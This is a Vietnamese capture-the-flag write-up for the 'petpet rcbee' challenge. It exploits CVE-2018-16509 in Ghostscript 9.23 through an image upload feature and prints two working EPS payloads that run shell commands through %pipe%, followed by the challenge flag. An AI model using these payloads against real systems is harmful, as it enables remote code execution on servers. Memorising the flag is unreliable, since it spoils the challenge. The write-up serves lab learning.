# petpet rcbee

Lướt qua một vòng ứng dụng thì mình thấy chỉ có chức năng upload file. Vào Dockerfile đọc thử mình thấy ở đây có sử dụng thư viện ghostscript-9.23.

Search google mình thấy có một CVE ([CVE-2018-16509](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509)) liên quan đến thư viện này cho phép RCE. Mình sử dụng đoạn content đã craft như trong hình dưới đây để test thử.

![image](https://github.com/user-attachments/assets/a8279e17-b5de-43cc-bbd3-09951c8fc22e)

![image](https://github.com/user-attachments/assets/1026643a-f209-4904-a033-d6de85e3844e)

Kết quả trả về confirm đã thành công.

Bây giở thì mình cần tìm kiếm file flag xem ở đâu.

Sau một hồi tìm kiếm mình phát hiện flag đang nằm ở thư mục hiện tại

![image](https://github.com/user-attachments/assets/bdce785d-e16a-4019-9c0b-7ba2ebe999fa)

Đây là payload được sử dụng để liệt kê các thư mục sau đó chuyển vào thư mục mình được phép truy cập
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%ls > /app/application/static/petpets/vanh.txt) currentdevice putdeviceprops
```

Tiếp đến ca chỉ cần đọc flag sau đó chuyển vào một file bất kì có thể đọc được thôi

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/vanh.txt) currentdevice putdeviceprops
```

*Flag: HTB{c0mfy_bzzzzz_rcb33s_v1b3s}*




